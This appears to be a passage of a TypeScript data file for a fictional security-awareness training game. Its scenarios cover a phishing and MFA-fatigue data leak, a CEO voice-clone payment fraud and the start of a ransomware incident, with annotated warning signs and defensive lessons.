/* Kavach Breach Room: game content.
   Every company, person and event here is fictional.
   Text fields may contain simple HTML (<b>, <br>, <span class=...>) and are rendered as authored content. */

export type Quality = 'best' | 'ok' | 'poor';
export type Tone = 'ok' | 'bad' | 'info';
export type Topic = 'phishing' | 'identity' | 'data' | 'fraud' | 'response' | 'reporting' | 'physical' | 'cloud' | 'supply' | 'secrets' | 'insider' | 'social' | 'vendor' | 'leadership' | 'comms' | 'governance';
/** Feedback for the end-of-game report: praise (good), a lesson (gap) and a practical action (act). */
export interface Feedback { topic?: Topic; good?: string; gap?: string; act?: string }

export interface SpotItem { id: string; html: string; head?: string; flag?: boolean; note?: string }
export interface PickItem { id: string; text: string; bad?: boolean; why?: string }
export interface ChoiceOption { id: string; text: string; right?: boolean; why?: string }
export interface OrderStep { id: string; text: string }
export interface DecisionOption { id: string; text: string; q: Quality; pen?: number; note: string }

interface LockBase extends Feedback { name: string; task: string; hint: string; debrief: string }
export interface SpotLock extends LockBase { type: 'spot'; frame: 'mail' | 'chat' | 'code' | 'note'; items: SpotItem[]; chatName?: string; chatSub?: string; fileName?: string }
/** rows: table cells; an optional last cell of 'ok' | 'bad' | 'info' colours the final column. */
export interface CodeLock extends LockBase { type: 'code'; mask: string; answer: string; cols: string[]; rows: string[][]; pre?: string }
export interface PickLock extends LockBase { type: 'pick'; items: PickItem[] }
export interface ChoiceLock extends LockBase { type: 'choice'; options: ChoiceOption[] }
export interface OrderLock extends LockBase { type: 'order'; steps: OrderStep[]; shown: string[] }
export type Lock = SpotLock | CodeLock | PickLock | ChoiceLock | OrderLock;

export interface Decision extends Feedback { type: 'decision'; name: string; prompt: string; options: DecisionOption[] }
export interface Inject { id: string; name: string; prompt: string; options: DecisionOption[]; topic?: Topic; act?: string }

export interface Scenario {
  id: string;
  track: 'core' | 'dev' | 'lead';
  title: string;
  company: string;
  threat: string;
  lede: string;
  /** Locks 1 to 6, played in order. The decision comes after lock 3. */
  locks: Lock[];
  decision: Decision;
  /** Extra lock a team must clear after a poor decision. */
  detour: Lock;
  lessons: string[];
}

export const SCENARIOS: Scenario[] = [
  {
    "id": "leak",
    "title": "The Friday Leak",
    "company": "NovaPay",
    "threat": "Phishing emails, approval spam (MFA fatigue), careless data sharing",
    "lede": "Friday, 6:40 PM. A file with 2,000 NovaPay customer records is being sold online. Find out how it got out.",
    "locks": [
      {
        "type": "spot",
        "frame": "mail",
        "name": "The email",
        "task": "Riya from Settlement Ops got this email at 5:10 PM. Tap the 4 warning signs that should have made her stop.",
        "items": [
          {
            "id": "from",
            "head": "From",
            "html": "NovaPay IT Desk &lt;helpdesk@novapay-support.co&gt;",
            "flag": true,
            "note": "Fake look-alike address. Real NovaPay emails come from novapay.com, not novapay-support.co."
          },
          {
            "id": "to",
            "head": "To",
            "html": "Riya Mehta"
          },
          {
            "id": "subj",
            "head": "Subject",
            "html": "Mailbox move tonight"
          },
          {
            "id": "greet",
            "html": "Hi Riya,"
          },
          {
            "id": "move",
            "html": "We are moving the Settlement team’s mailboxes to a new server this evening."
          },
          {
            "id": "urgent",
            "html": "Your mailbox will be locked in 30 minutes unless you verify your account.",
            "flag": true,
            "note": "Fake rush. A tight deadline is meant to stop you thinking."
          },
          {
            "id": "link",
            "html": "<span class=\"fake-btn\">Verify on novapay.com</span>",
            "flag": true,
            "note": "The button really opens novapay-verify.top/login, a fake site. Check where a link goes before you sign in."
          },
          {
            "id": "creds",
            "html": "On the next page, type your password and the code that appears on your phone.",
            "flag": true,
            "note": "Real IT staff never ask for your password or sign-in code. Nobody genuine does."
          },
          {
            "id": "sign",
            "html": "Thanks,<br>IT Service Desk, Floor 3, ext. 4410"
          }
        ],
        "hint": "Check the sender’s address and where the button really goes. Then look at how the email rushes her, and what it asks her to type in.",
        "debrief": "Riya clicked at 5:12 PM and typed her password into the fake page. But every NovaPay sign-in also needs her to tap Approve on her phone. So how did the attacker get past that?<br><b>Remember:</b> Check the sender’s address and where a link really goes before you sign in.",
        "topic": "phishing",
        "good": "You spotted every sign of a fake look-alike email.",
        "gap": "Check the sender’s real address and where a link really goes before you sign in anywhere.",
        "act": "Long-press or hover over a link to see where it really goes, and report fake emails to Security."
      },
      {
        "type": "code",
        "name": "The sign-in log",
        "mask": "##:##",
        "answer": "1719",
        "task": "The attacker had Riya’s password but still needed her approval on her phone. Here’s her Friday sign-in record. Enter the time the attacker got in.",
        "cols": [
          "Time",
          "Where and device",
          "Result"
        ],
        "rows": [
          [
            "09:02",
            "Mumbai<br><span class=\"sub\">Riya’s laptop</span>",
            "Signed in",
            "ok"
          ],
          [
            "13:47",
            "Mumbai<br><span class=\"sub\">Riya’s phone</span>",
            "Signed in",
            "ok"
          ],
          [
            "17:13",
            "Amsterdam (VPN: hides real location)<br><span class=\"sub\">Unknown new Windows PC</span>",
            "Approval request denied",
            "bad"
          ],
          [
            "17:14–17:18",
            "Amsterdam (VPN)<br><span class=\"sub\">Same unknown PC</span>",
            "11 more requests, all denied",
            "bad"
          ],
          [
            "17:19",
            "Amsterdam (VPN)<br><span class=\"sub\">Same unknown PC</span>",
            "Request approved. Signed in",
            "ok"
          ],
          [
            "17:21",
            "Mumbai<br><span class=\"sub\">Riya’s phone</span>",
            "Signed in",
            "ok"
          ],
          [
            "17:26",
            "Amsterdam (VPN)<br><span class=\"sub\">Same unknown PC</span>",
            "Searched her mailbox for “settlement”",
            "info"
          ]
        ],
        "hint": "Riya kept denying requests from the unknown PC. Find the moment one finally got through.",
        "debrief": "Thirteen approval requests buzzed while Riya was leaving, and she tapped Approve just to make them stop. This is MFA fatigue (flooding you with sign-in approvals until you give in). But the leaked file was never in Riya’s mailbox. So where did it come from?<br><b>Remember:</b> An approval you didn’t ask for is an attack. Deny it and report it.",
        "topic": "identity",
        "good": "You read the sign-in record and found the moment the attacker got in.",
        "gap": "A flood of approval requests you didn’t start is an attack. Deny them and report it.",
        "act": "Never approve a sign-in request you didn’t start. Report it straight away."
      },
      {
        "type": "pick",
        "name": "The data trail",
        "task": "Here’s what Riya did with customer data this week. Pick the 3 habits that let the data out of NovaPay’s control.",
        "items": [
          {
            "id": "link",
            "text": "Shared the full settlement file with a vendor using an “Anyone with the link” share.",
            "bad": true
          },
          {
            "id": "lock",
            "text": "Locked her screen before going to lunch."
          },
          {
            "id": "ai",
            "text": "Pasted 40 customer rows into a free AI chatbot to help sort out mismatches.",
            "bad": true
          },
          {
            "id": "folder",
            "text": "Saved her working file in the team’s restricted Settlement folder."
          },
          {
            "id": "gmail",
            "text": "Forwarded the file to her personal Gmail to finish the work at home.",
            "bad": true
          },
          {
            "id": "ask",
            "text": "Asked IT before installing a PDF converter."
          }
        ],
        "hint": "For each habit, ask: could someone outside NovaPay now see or copy this data?",
        "debrief": "The attacker searched Riya’s sent mail, found the “Anyone with the link” share, and downloaded all 2,000 rows. That is the file now up for sale. The chatbot and personal Gmail weren’t used this time, but they were open doors too.<br><b>Remember:</b> Customer data stays in approved places: no public links, personal email or free AI tools.",
        "topic": "data",
        "good": "You knew which habits let customer data slip out of NovaPay’s control.",
        "gap": "Public links, personal email and free AI tools all move data outside company control.",
        "act": "Share files only through approved tools, and never paste customer data into free AI tools."
      },
      {
        "type": "spot",
        "frame": "note",
        "name": "The listing",
        "task": "The seller posted a free sample to prove the file is real. Tap the 4 details that are personal data (they point to a real person).",
        "items": [
          {
            "id": "title",
            "html": "<b>SELLING:</b> NovaPay settlement data, 2,000 rows, fresh this week"
          },
          {
            "id": "price",
            "html": "Price: 0.4 Bitcoin. Payment through a middleman accepted."
          },
          {
            "id": "name",
            "html": "<b>Name:</b> Anil K. Sharma",
            "flag": true,
            "note": "A full name points to one real person."
          },
          {
            "id": "mob",
            "html": "<b>Mobile:</b> 98201 47736",
            "flag": true,
            "note": "A mobile number leads straight to one person."
          },
          {
            "id": "upi",
            "html": "<b>UPI ID:</b> anil.sharma@upi",
            "flag": true,
            "note": "A UPI ID is linked to a real person and their bank account."
          },
          {
            "id": "acct",
            "html": "<b>Account:</b> 50100234174417, IFSC KVRB0001234",
            "flag": true,
            "note": "A bank account number and IFSC point to one person’s money."
          },
          {
            "id": "batch",
            "html": "<b>Batch:</b> NP-STL-0915-07"
          },
          {
            "id": "win",
            "html": "<b>Settlement window:</b> 15 Sep, 18:00 to 20:00"
          }
        ],
        "hint": "The sale, batch and time lines point to no one. Which lines lead to one real customer?",
        "debrief": "Names, mobile numbers, UPI IDs and account numbers identify real people. So this is a personal data breach, and NovaPay and its bank clients have legal duties to report it. Never buy or download a leaked file to check it: send the link to Security.<br><b>Remember:</b> Details that point to a real person are personal data. Report leaks; never download them.",
        "topic": "data",
        "good": "You know what makes data personal, and that leaked files are never downloaded.",
        "gap": "Names, phone numbers, UPI IDs and account numbers are personal data, and the law protects them.",
        "act": "Treat any file with customer details as personal data. Report leaks; never download them."
      },
      {
        "type": "order",
        "name": "The response",
        "task": "It’s 6:52 PM and you now know what happened. Tap the 4 steps in the order your team should do them.",
        "steps": [
          {
            "id": "report",
            "text": "Report it to the security team now, even though it’s Friday evening."
          },
          {
            "id": "cutoff",
            "text": "Cut the attacker off: reset Riya’s password, sign her out everywhere, turn off the public link."
          },
          {
            "id": "investigate",
            "text": "Check the system records for anything else the attacker opened or downloaded."
          },
          {
            "id": "inform",
            "text": "Tell the affected clients through the agreed official route."
          }
        ],
        "shown": [
          "cutoff",
          "inform",
          "report",
          "investigate"
        ],
        "hint": "Nothing can start until Security knows. And you can’t measure the damage while the attacker is still inside.",
        "debrief": "Reporting fast lets Security stop a breach before it spreads. Report early, even when you’re unsure. A false alarm costs minutes; a late report costs clients.<br><b>Remember:</b> Report first, then cut the attacker off.",
        "topic": "response",
        "good": "You put the response steps in the right order.",
        "gap": "Report first, cut the attacker off, then check the damage and tell clients. Order matters.",
        "act": "Learn the first two steps of any incident: report it, then cut the attacker off."
      },
      {
        "type": "choice",
        "name": "The safe share",
        "task": "Monday. The vendor still needs the settlement file every week. What’s the safe way to share it?",
        "options": [
          {
            "id": "free",
            "text": "Upload it to a free file-sharing website and send the vendor the link on WhatsApp.",
            "why": "Free sites and chat apps put the file outside NovaPay’s control, with no record of who opened it."
          },
          {
            "id": "tool",
            "text": "Use the approved sharing tool: named vendor staff only, an expiry date, and a download record.",
            "right": true,
            "why": "Only named people can open it, access ends on a set date, and every download is recorded."
          },
          {
            "id": "link",
            "text": "Keep using “Anyone with the link”, but delete the link a day later, once the vendor has it.",
            "why": "For that whole day, anyone who gets the link can download 2,000 customers’ data."
          },
          {
            "id": "zip",
            "text": "Email it as a password-protected zip file, with the password in the same email.",
            "why": "Anyone who gets the email gets the password too."
          }
        ],
        "hint": "Pick the option where NovaPay decides who can open the file and for how long, and can see who did.",
        "debrief": "Approved tools with named access, an expiry date and a download record keep customer data in NovaPay’s control. If something goes wrong, the record shows exactly who opened what.<br><b>Remember:</b> Share customer data only through approved tools, with named people and an expiry date.",
        "topic": "data",
        "good": "You chose the sharing method that keeps data controlled and traceable.",
        "gap": "Approved tools with named access, an expiry date and a download record are the safe way to share customer data.",
        "act": "Set an expiry date on every share you send outside NovaPay."
      }
    ],
    "lessons": [
      "Check the sender’s address and where a link really goes before you sign in anywhere.",
      "A sign-in approval you didn’t ask for is an attack. Deny it and report it.",
      "Keep customer data in approved places: no public links, personal email or free AI tools.",
      "Report early, even when you’re unsure.",
      "Names, mobile numbers, UPI IDs and account numbers are personal data. Never buy or download a leaked file.",
      "Share data only through approved tools, with named people and an expiry date."
    ],
    "decision": {
      "type": "decision",
      "name": "The first call",
      "prompt": "It’s 6:45 PM on Friday. You’ve just found out an attacker took over Riya’s account. What do you do first?",
      "options": [
        {
          "id": "call",
          "text": "Call the security team’s incident number right away.",
          "q": "best",
          "note": "Right call. The attacker is in the account right now, so people need to act now, not on Monday."
        },
        {
          "id": "mail",
          "text": "Email the security mailbox and keep looking into it yourself.",
          "q": "ok",
          "note": "An email may sit unread all weekend. For a live attack, call. +60 seconds."
        },
        {
          "id": "wait",
          "text": "Wait until Monday. It might be a false alarm.",
          "q": "poor",
          "note": "The attacker had the whole weekend. Now you have to clean up the damage. +120 seconds, and a detour."
        }
      ],
      "topic": "response",
      "good": "You reported a live attack by phone, straight away.",
      "gap": "A live attack needs people on it now. Call the incident number; don’t wait or rely on email.",
      "act": "Save the security incident number in your phone today."
    },
    "detour": {
      "type": "pick",
      "name": "Weekend damage",
      "task": "Monday, 9 AM. The attacker had Riya’s mailbox all weekend. Pick the 2 signs that show what they did.",
      "items": [
        {
          "id": "fwd",
          "text": "A new rule sending a copy of every email to an unknown Gmail address",
          "bad": true,
          "why": "A forwarding rule lets the attacker keep reading her mail even after her password is reset."
        },
        {
          "id": "ooo",
          "text": "Riya’s out-of-office reply, which she set herself on Friday"
        },
        {
          "id": "sent",
          "text": "Emails in Sent asking to change payment details that Riya never wrote",
          "bad": true,
          "why": "Attackers use a trusted mailbox to trick clients and vendors into paying them."
        },
        {
          "id": "cal",
          "text": "A team meeting invite from her manager"
        }
      ],
      "hint": "Look for changes and emails that Riya didn’t make herself.",
      "debrief": "Security removed the forwarding rule and warned the clients about the fake emails. Waiting until Monday gave the attacker a whole weekend.<br><b>Remember:</b> Report an account takeover at once, even on a Friday evening.",
      "topic": "response",
      "good": "You spotted what an attacker does inside a mailbox.",
      "gap": "Delay gives attackers time to set up hidden forwarding and send fake emails from a trusted mailbox.",
      "act": "After any account takeover, ask Security to check mail forwarding rules and sent items."
    },
    "track": "core"
  },
  {
    "id": "bec",
    "title": "The Urgent Transfer",
    "company": "Zentra Finserv",
    "threat": "Fake boss messages, a copied voice, money sent to a fraudster",
    "lede": "Monday, 1:15 PM. ₹48 lakh meant for a logistics vendor has gone to a fraudster’s account. The “CFO” who asked for it never sent a single message.",
    "locks": [
      {
        "type": "spot",
        "frame": "chat",
        "name": "The message",
        "chatName": "Arjun Rao (CFO)",
        "chatSub": "+91 98xxx x1207 · not in your contacts",
        "task": "Neha in Treasury (the team that pays vendors) got these WhatsApp messages at 11:02 AM. Tap the 4 warning signs.",
        "items": [
          {
            "id": "num",
            "html": "Hi Neha, Arjun here. This is my new number, my old phone died.",
            "flag": true,
            "note": "A “new number” from a senior person is a classic trick, so check on the number you already have."
          },
          {
            "id": "q",
            "html": "Hope the quarter close is going okay."
          },
          {
            "id": "secret",
            "html": "We’re working on a secret company deal. Please don’t discuss this with anyone, not even your manager.",
            "flag": true,
            "note": "Being told to keep it secret, even from your manager, is how fraudsters stop you checking."
          },
          {
            "id": "amt",
            "html": "Need ₹48,00,000 sent to Brightline Logistics today as an advance."
          },
          {
            "id": "bank",
            "html": "Their bank account has changed. Pay the new account in the attached photo, not the one we have on file.",
            "flag": true,
            "note": "Any change to where money goes must be confirmed on a number you already know."
          },
          {
            "id": "img",
            "html": "<span class=\"att\">IMG_2291.jpg · bank details</span>"
          },
          {
            "id": "rush",
            "html": "It must be done before 12. Skip the usual two approvals, I’ll sign the form later.",
            "flag": true,
            "note": "Rushing you and asking you to skip approvals is a big warning sign: approvals exist for moments like this."
          },
          {
            "id": "thx",
            "html": "Thanks, you’re a star."
          }
        ],
        "hint": "Ask four questions: Is this really him? What am I told not to do? Where is the money going? Why the rush?",
        "debrief": "Neha had doubts. Then her phone rang. It was Arjun’s voice, calm and familiar, asking if the payment was done. What should she do next?<br><b>Remember:</b> A “new number”, secrecy and a rush to skip approvals mean stop and check.",
        "topic": "social",
        "good": "You caught the new-number, secrecy and rush tricks.",
        "gap": "A new number, secrecy and pressure to skip approvals together mean stop and check.",
        "act": "Check any unusual request from a senior person on a number you already have."
      },
      {
        "type": "choice",
        "name": "The voice call",
        "task": "The caller sounds exactly like Arjun. What is the one safe way to check it’s really him?",
        "options": [
          {
            "id": "q",
            "text": "Ask him a personal question that only Arjun would know.",
            "why": "Personal details are often easy to find online, and the caller still controls the call."
          },
          {
            "id": "cb",
            "text": "Hang up and call him on his number in the company directory.",
            "right": true
          },
          {
            "id": "sel",
            "text": "Ask him to send a selfie on WhatsApp to prove it’s him.",
            "why": "Photos and videos can be faked or stolen too."
          },
          {
            "id": "wa",
            "text": "Reply on WhatsApp: “Is this really you, Arjun?”",
            "why": "That just asks the fraudster to say yes."
          }
        ],
        "hint": "Three options keep you on the fraudster’s call or chat. Which one uses a number you already trust?",
        "debrief": "Tools can now copy a voice from a few seconds of a podcast or video. The only safe check is to hang up and call back on a number you already trust. Neha didn’t, and next came a request to change Brightline’s bank account.<br><b>Remember:</b> A familiar voice is not proof. Hang up and call back on a known number.",
        "topic": "social",
        "good": "You knew a familiar voice is no longer proof.",
        "gap": "Voices can be copied. Hang up and call back on a number you already trust.",
        "act": "Call back on a known number for every payment request, whoever is calling."
      },
      {
        "type": "pick",
        "name": "The bank change",
        "task": "The “CFO” also forwarded a letter from Brightline: “Our bank account has changed from today.” Pick the 3 checks Treasury must do before updating a vendor’s bank details.",
        "items": [
          {
            "id": "call",
            "text": "Call Brightline back on the phone number already in our approved vendor list.",
            "bad": true,
            "why": "Calling back on a number you already have is the one check a fraudster can’t fake."
          },
          {
            "id": "look",
            "text": "Check that the letterhead, logo and signature look genuine.",
            "why": "Letterheads, logos and signatures are easy to copy."
          },
          {
            "id": "maker",
            "text": "Get a second person to approve the change in the payments system.",
            "bad": true,
            "why": "One person can be fooled. Two separate checks are much harder to beat."
          },
          {
            "id": "reply",
            "text": "Reply to the email and ask them to confirm the new account.",
            "why": "If the email is fake, the fraudster just replies “Confirmed”."
          },
          {
            "id": "penny",
            "text": "Before the first payment, check the new account is in Brightline’s name.",
            "bad": true,
            "why": "A name check shows when the account belongs to someone else."
          },
          {
            "id": "cfo",
            "text": "Go ahead with it, because the CFO has already approved it.",
            "why": "A senior person’s OK is not a check. Fraudsters count on people obeying."
          }
        ],
        "hint": "The letter, the email and the “CFO” could all be fake. Pick checks that use people and details the fraudster can’t control.",
        "debrief": "These checks exist for exactly this moment. Neha knew them, but the “CFO” was about to turn up the pressure.<br><b>Remember:</b> A bank detail change needs a call-back on a known number, a second approver and a name check.",
        "topic": "fraud",
        "good": "You knew the three checks that stop money going to the wrong account.",
        "gap": "Bank detail changes need a call-back on a known number, a second approver and a name check.",
        "act": "Never change vendor bank details without a call-back and a second approval."
      },
      {
        "type": "code",
        "name": "The money trail",
        "mask": "####",
        "answer": "8093",
        "task": "Treasury made 5 payments on Monday. Compare each account with the approved vendor list. Enter the last 4 digits of the one that doesn’t match: that’s the fraudster’s account.",
        "pre": "<p class=\"tcap\">Approved vendor list (the correct bank accounts)</p><div class=\"log-wrap\"><table><thead><tr><th>Vendor</th><th>Bank account</th></tr></thead><tbody><tr><td>Brightline Logistics</td><td class=\"t\">•••• 4417</td></tr><tr><td>Sunrise Facility Services</td><td class=\"t\">•••• 2290</td></tr><tr><td>Kaveri Cloud Hosting</td><td class=\"t\">•••• 7731</td></tr><tr><td>Pinnacle Print Works</td><td class=\"t\">•••• 0518</td></tr><tr><td>Orion Payroll Bureau</td><td class=\"t\">•••• 6602</td></tr></tbody></table></div><p class=\"tcap\">Monday’s payments (what was actually paid)</p>",
        "cols": [
          "Time",
          "Paid to",
          "Account",
          "Amount"
        ],
        "rows": [
          [
            "10:05",
            "Sunrise Facility Services",
            "•••• 2290",
            "₹3,40,000"
          ],
          [
            "10:40",
            "Kaveri Cloud Hosting",
            "•••• 7731",
            "₹6,12,500"
          ],
          [
            "11:52",
            "Brightline Logistics",
            "•••• 8093",
            "₹48,00,000"
          ],
          [
            "12:30",
            "Pinnacle Print Works",
            "•••• 0518",
            "₹82,000"
          ],
          [
            "12:47",
            "Orion Payroll Bureau",
            "•••• 6602",
            "₹11,25,000"
          ]
        ],
        "hint": "Every vendor name looks right. Match each account number with the approved list, line by line.",
        "debrief": "The payment said Brightline, but the account was a mule account (one used to receive stolen money) opened two weeks ago. Banks send money by account number, not by name. The money is moving. What now?<br><b>Remember:</b> Banks pay by account number, not name. Always check the number.",
        "topic": "fraud",
        "good": "You followed the money to the fraudster’s account.",
        "gap": "Banks pay by account number, not by name. Check every account against the approved vendor list.",
        "act": "Check any new account against the approved vendor list before paying."
      },
      {
        "type": "order",
        "name": "The response",
        "task": "It’s 1:15 PM and the money has gone. Put the response steps in the right order.",
        "steps": [
          {
            "id": "alarm",
            "text": "Raise the alarm now: tell the security team and call the bank to stop the transfer."
          },
          {
            "id": "evid",
            "text": "Save the evidence: screenshot the chat and keep the call log. Don’t delete anything."
          },
          {
            "id": "file",
            "text": "File a complaint on the 1930 cybercrime helpline or cybercrime.gov.in with the payment details."
          },
          {
            "id": "fix",
            "text": "Fix the gap: no bank detail changes without a call-back on a known number."
          }
        ],
        "shown": [
          "fix",
          "file",
          "alarm",
          "evid"
        ],
        "hint": "Stolen money moves fast, so first try to stop it. Then ask: what does a complaint need before you file it?",
        "debrief": "The first hour after a fraud transfer is when a bank is most likely to freeze it. Speed and evidence help get money back. Fixing the process stops it happening again.<br><b>Remember:</b> Payment fraud? Call the bank and Security at once, then report on 1930.",
        "topic": "reporting",
        "good": "You knew the order that gives the best chance of getting money back.",
        "gap": "Alert the bank and Security at once, save evidence, report on 1930 or cybercrime.gov.in, then fix the gap.",
        "act": "Report payment fraud within the hour: bank, Security, then 1930."
      },
      {
        "type": "spot",
        "frame": "note",
        "name": "The overshare",
        "task": "A week later, investigators ask: how did the fraudsters know so much? Tap the 4 details in Arjun’s public LinkedIn post that helped them.",
        "items": [
          {
            "id": "hd",
            "html": "<b>Arjun Rao</b> · CFO, Zentra Finserv · Public post"
          },
          {
            "id": "vendor",
            "html": "Thrilled to announce our new logistics partner, Brightline Logistics!",
            "flag": true,
            "note": "Naming the vendor told fraudsters which payments to redirect."
          },
          {
            "id": "team",
            "html": "Huge thanks to the whole team for a strong quarter."
          },
          {
            "id": "neha",
            "html": "Special shout-out to Neha in Treasury, who makes sure every vendor gets paid on time.",
            "flag": true,
            "note": "Now they knew, by name, who sends the payments."
          },
          {
            "id": "pod",
            "html": "Catch my 40-minute podcast on life as a CFO (link in the comments).",
            "flag": true,
            "note": "Forty minutes of clear audio is plenty to copy someone’s voice."
          },
          {
            "id": "trip",
            "html": "Off to Singapore all next week for a big deal. Mostly offline!",
            "flag": true,
            "note": "Travel and “mostly offline” made the “new number, can’t talk” story believable."
          },
          {
            "id": "tags",
            "html": "#fintech #growth #leadership"
          }
        ],
        "hint": "For each line, ask: does it tell a stranger which vendor we pay, who sends payments, how Arjun sounds, or when he’s hard to reach?",
        "debrief": "Each detail was harmless on its own. Together they gave the fraudsters the vendor, the target, the voice and the excuse.<br><b>Remember:</b> Think before you post about vendors, colleagues, travel or recordings.",
        "topic": "social",
        "good": "You spotted how public posts help fraudsters plan.",
        "gap": "Posts about vendors, colleagues, travel and recordings give fraudsters what they need.",
        "act": "Before posting about work, ask: could this help someone pretend to be us?"
      }
    ],
    "lessons": [
      "A “new number” from a senior person isn’t proof. Call back on the number you already have.",
      "Secrecy, a rush and “skip the approvals” together mean stop.",
      "A familiar voice is no longer proof. Hang up and call back.",
      "Money sent to a fraudster? Tell the bank within the hour and report on 1930.",
      "A bank detail change needs a call-back on a known number and a second approver.",
      "Posts about vendors, colleagues and travel help fraudsters plan."
    ],
    "decision": {
      "type": "decision",
      "name": "The pressure",
      "prompt": "Neha hesitates. The “CFO” calls again, angry: the deal will fall through in 10 minutes if the money doesn’t go. What does she do?",
      "options": [
        {
          "id": "hold",
          "text": "Follow process: no payment until she calls him on the directory number.",
          "q": "best",
          "note": "Pressure is the attack. Following process protects her and the company."
        },
        {
          "id": "pair",
          "text": "Ask a colleague to approve it quickly so it isn’t only her decision.",
          "q": "ok",
          "note": "Two people fooled is still fraud. The check must happen on a separate, trusted number. +60 seconds."
        },
        {
          "id": "pay",
          "text": "Pay now to keep the CFO happy and avoid getting into trouble.",
          "q": "poor",
          "note": "The money has gone. Now it’s a race to get it back. +120 seconds, and a detour."
        }
      ],
      "topic": "fraud",
      "good": "You stuck to the process under pressure from the top.",
      "gap": "Pressure and anger are tricks. Process exists for exactly these moments.",
      "act": "Report any pressure to skip checks to your manager or Security."
    },
    "detour": {
      "type": "pick",
      "name": "The recall",
      "task": "You call your bank’s fraud desk to try to get the money back. Pick the 3 details they need.",
      "items": [
        {
          "id": "utr",
          "text": "The payment’s reference number (UTR)",
          "bad": true
        },
        {
          "id": "otp",
          "text": "The OTP (one-time code) that just arrived on your phone",
          "why": "No real bank ever needs your OTP or password, not even its fraud desk."
        },
        {
          "id": "amt",
          "text": "The amount, date and time of the transfer",
          "bad": true
        },
        {
          "id": "ben",
          "text": "The receiving account number and IFSC (bank branch code)",
          "bad": true
        },
        {
          "id": "pwd",
          "text": "Your internet banking password",
          "why": "Never share it with anyone, including the bank."
        }
      ],
      "hint": "Pick facts about the payment itself. A real bank never asks for your secrets.",
      "debrief": "The bank froze part of the money in the mule account (the fraudster’s receiving account). In a recall, every minute counts.<br><b>Remember:</b> Give the bank payment facts fast, but never your OTP or password.",
      "topic": "response",
      "good": "You knew what the bank needs to get a payment back.",
      "gap": "To recall a fraud payment, the bank needs the UTR, amount, time and receiving account details, fast.",
      "act": "Keep your bank’s fraud desk number and the 1930 helpline handy."
    },
    "track": "core"
  },
  {
    "id": "ransom",
    "title": "Ransomware Monday",
    "company": "Kestrel Pay",
    "threat": "Dangerous attachments, ransomware (file-locking attacks), backups",
    "lede": "Monday, 9:05 AM. Every Settlement screen shows the same red note: “Your files are encrypted. Pay 12 Bitcoin in 72 hours.” Ransomware has locked the files. Find out how it got in, and recover.",
    "locks": [
      {
        "type": "pick",
        "name": "The attachments",
        "task": "On Friday evening, the Settlement team received these 6 attachments. Pick the 3 that could secretly run a program on a laptop.",
        "items": [
          {
            "id": "exe",
            "text": "<b>Invoice_Sept.pdf.exe</b> from accounts@kestre1pay.com",
            "bad": true,
            "why": "It really ends in .exe, so it’s a program dressed up as a PDF. The sender uses a 1 instead of an l."
          },
          {
            "id": "ppt",
            "text": "<b>Q3_Review.pptx</b> shared by your manager from Kestrel’s SharePoint"
          },
          {
            "id": "xlsm",
            "text": "<b>Payroll_Revision.xlsm</b>: “Click Enable Content to see the figures”",
            "bad": true,
            "why": "An .xlsm file can carry macros (hidden programs). “Enable Content” runs them."
          },
          {
            "id": "jpg",
            "text": "<b>Team_Offsite.jpg</b> photo from a colleague on your floor"
          },
          {
            "id": "zip",
            "text": "<b>Courier_Delivery.zip</b> with a file called Label.js inside",
            "bad": true,
            "why": "A .js file is a script (a small program). Windows can run it with a double-click."
          },
          {
            "id": "pdf",
            "text": "<b>Leave_Policy_2026.pdf</b> from hr@kestrelpay.com, same as the intranet copy"
          }
        ],
        "hint": "Read each file name to the very end: the last letters decide what it is. Check senders letter by letter.",
        "debrief": "Two people opened Payroll_Revision.xlsm. On one laptop the macro was blocked. On the other, it ran. Which laptop let the attacker in?<br><b>Remember:</b> Read the whole file name, and never click “Enable Content” on a file you didn’t expect.",
        "topic": "phishing",
        "good": "You spotted which attachments can run hidden programs.",
        "gap": "Files ending in .exe, files with macros, and scripts inside zips can all run code. Read the whole file name.",
        "act": "Never click “Enable Content” on a document you didn’t expect. Report it instead."
      },
      {
        "type": "code",
        "name": "The timeline",
        "mask": "KP-####",
        "answer": "0417",
        "task": "This is the security tool’s log, in time order. Find the laptop where the attacker first got in, and enter its machine number.",
        "cols": [
          "When",
          "Machine",
          "Event"
        ],
        "rows": [
          [
            "Fri 18:02",
            "KP-0388",
            "Opened Payroll_Revision.xlsm. Macro was blocked, nothing ran",
            "ok"
          ],
          [
            "Fri 18:42",
            "KP-0417",
            "Opened Payroll_Revision.xlsm. Macro ran and opened PowerShell (a command tool)",
            "bad"
          ],
          [
            "Sat 03:10",
            "KP-0417",
            "New admin (full-control) account “svc-backup2” created",
            "bad"
          ],
          [
            "Sun 23:55",
            "FS-SETTLE-01",
            "Someone logged in remotely as svc-backup2",
            "bad"
          ],
          [
            "Mon 02:05",
            "FS-SETTLE-01",
            "Started locking (encrypting) all files",
            "bad"
          ],
          [
            "Mon 02:09",
            "KP-1187",
            "Started locking (encrypting) all files",
            "bad"
          ]
        ],
        "hint": "Locking the files was the attacker’s last step, not the first. Go back to Friday and find where the macro was not stopped.",
        "debrief": "The attacker got in on Friday at 6:42 PM. They spent the weekend quietly setting up their own admin account, then locked the files early on Monday. Now: how do you get the files back?<br><b>Remember:</b> Attackers often hide for days before they strike. Report odd warnings early.",
        "topic": "response",
        "good": "You traced the attack back to the first infected laptop.",
        "gap": "Attackers often hide quietly for days before locking files. Early warning signs matter.",
        "act": "Report strange pop-ups or blocked-macro warnings to IT, even if everything seems fine."
      },
      {
        "type": "spot",
        "frame": "note",
        "name": "The ransom note",
        "task": "The note on every screen offers only one way out: pay. Tap the 4 lines meant to pressure you.",
        "items": [
          {
            "id": "hd",
            "html": "<b>YOUR FILES ARE ENCRYPTED</b>"
          },
          {
            "id": "enc",
            "html": "All Settlement files and databases have been locked."
          },
          {
            "id": "dbl",
            "html": "Pay 12 Bitcoin within 72 hours. After that, the price doubles.",
            "flag": true,
            "note": "A deadline and a rising price are there to make you panic and rush."
          },
          {
            "id": "leak",
            "html": "We have also copied 40 GB of customer data. Don’t pay, and we publish it.",
            "flag": true,
            "note": "Threatening to leak your data, on top of locking it, adds extra pressure to pay."
          },
          {
            "id": "police",
            "html": "Do NOT contact the police or your IT team, or your key will be destroyed.",
            "flag": true,
            "note": "They want to cut you off from help. Always tell Security."
          },
          {
            "id": "chat",
            "html": "Questions? Chat with our support team at the link below."
          },
          {
            "id": "disc",
            "html": "Pay within 24 hours and get 30% off.",
            "flag": true,
            "note": "A discount is a sales trick to make you pay fast. It doesn’t make paying safe."
          }
        ],
        "hint": "Look for lines that hurry you, frighten you, or try to stop you getting help.",
